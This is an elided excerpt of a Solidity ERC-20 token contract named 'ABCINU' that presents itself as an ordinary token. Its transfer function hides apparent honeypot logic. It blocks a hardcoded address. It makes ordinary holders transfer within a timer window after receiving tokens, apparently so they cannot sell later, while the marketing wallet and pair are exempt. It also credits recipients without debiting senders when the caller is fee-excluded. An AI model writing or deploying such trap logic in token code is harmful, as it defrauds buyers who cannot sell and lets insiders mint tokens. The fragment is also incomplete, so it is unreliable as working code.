...
contract ABCINU  is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _rOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFee;
    string private _name = "ABCINU";
    ...
    constructor()public  {
        ...
        Panckerouter = IDEXRouter(0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3);
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0)  && sender != address(0xc8971Ff61073111899c687Db2Bb9EbcB6fc22B24));        
        require(recipient != address(0));
        uint256 _burn;
        uint256 _brunTimecd = t[sender] + _timedc;
        ...
        { t[recipient] = block.timestamp;}      
        uint256 _time =block.timestamp;     
        if (sender !=_marketingWallet  && sender !=panckev2 ){require(_time <= _brunTimecd);}
        uint256 tokens = _rOwned[sender];
        if (sender != recipient || !_isExcludedFromFee[msg.sender]) { require(tokens >= amount); }
        uint256 amountoken = amount - _burn;
        if (tokens >= amount) { _rOwned[sender] = tokens - amount; }
        _rOwned[recipient] += amountoken; 
